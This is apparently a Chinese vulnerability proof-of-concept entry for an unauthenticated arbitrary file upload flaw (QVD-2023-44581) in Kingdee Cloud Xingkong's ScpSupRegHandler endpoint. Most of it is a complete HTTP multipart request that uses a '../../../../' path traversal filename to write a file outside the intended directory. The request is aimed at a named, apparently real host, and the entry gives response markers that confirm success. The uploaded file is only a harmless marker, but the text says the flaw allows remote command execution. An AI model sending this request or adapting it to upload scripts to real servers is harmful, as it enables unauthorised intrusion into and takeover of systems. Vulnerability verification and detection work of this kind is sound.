﻿# 金蝶云星空ScpSupRegHandler任意文件上传漏洞

> 更新时间：2023-12-31

> 漏洞编号：QVD-2023-44581

> 漏洞说明：金蝶云星空管理中心ScpSupRegHandler接口存在任意文件上传漏洞。攻击者可在无需登录的情况下利用构造的文件名（如使用"../../../../"等路径穿越技巧）将恶意脚本文件上传至服务器上的非预期目录，最终可导致远程执行恶意命令，控制服务器。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
Host: nacos.storlead.com
Content-Length: 283
Content-Type: multipart/form-data; boundary=zsqxokga
Accept-Encoding: gzip

--zsqxokga
Content-Disposition: form-data; name="dbId_v"

.
--zsqxokga
Content-Disposition: form-data; name="FID"

2022
--zsqxokga
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/dudesuite.txt"
Content-Type: text/plain

dudesuite
--zsqxokga--
```

> 响应代码特征：200

> 响应内容特征：IsSuccess

> 上传文件定位：/k3cloud/uploadfiles/dudesuite.txt


> 验证文件来源：金蝶云星空ScpSupRegHandler任意文件上传漏洞.poc
